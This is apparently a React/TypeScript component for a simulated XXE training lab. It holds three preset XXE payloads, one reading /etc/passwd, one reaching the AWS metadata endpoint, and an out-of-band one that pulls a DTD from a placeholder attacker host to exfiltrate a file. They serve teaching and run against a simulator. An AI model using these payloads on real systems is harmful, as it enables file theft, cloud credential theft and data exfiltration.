import { GenericLab } from './GenericLab'
import { simulateXxe } from '../../utils/simulators/xxeSimulator'
import { useI18n } from '../../i18n'

const FILE_PAYLOAD = `<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>`
const SSRF_PAYLOAD = `<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<root>&xxe;</root>`
const PARAM_PAYLOAD = `<?xml version="1.0"?>\n<!DOCTYPE r [\n  <!ENTITY % file SYSTEM "file:///etc/hostname">\n  <!ENTITY % dtd SYSTEM "http://attacker.tld/x.dtd">\n  %dtd;\n]>\n<r>&exfil;</r>`

export function XxeLab() {
  const { locale } = useI18n()
  const isRu = locale === 'ru'
  return (
    <GenericLab
      config={{
        vulnType: 'XXE',
        defaultPayload: FILE_PAYLOAD,
        payloadLabel: isRu ? 'XML payload' : 'XML payload',
        bodyLanguage: 'xml',
        defaultScenario: { disableExternalEntities: false },
        scenarioControls: [
          { type: 'toggle', key: 'disableExternalEntities', label: isRu ? 'отключить внешние сущности' : 'disable external entities' }
        ],
        presets: [
          { id: 'file', title: 'Local file read', payload: FILE_PAYLOAD },
          { id: 'ssrf', title: 'XXE → SSRF AWS metadata', payload: SSRF_PAYLOAD },
          { id: 'param', title: 'OOB parameter entity', payload: PARAM_PAYLOAD }
        ],
        simulate: (payload, scenario, loc) => simulateXxe(payload, scenario, loc)
      }}
    />
  )
}
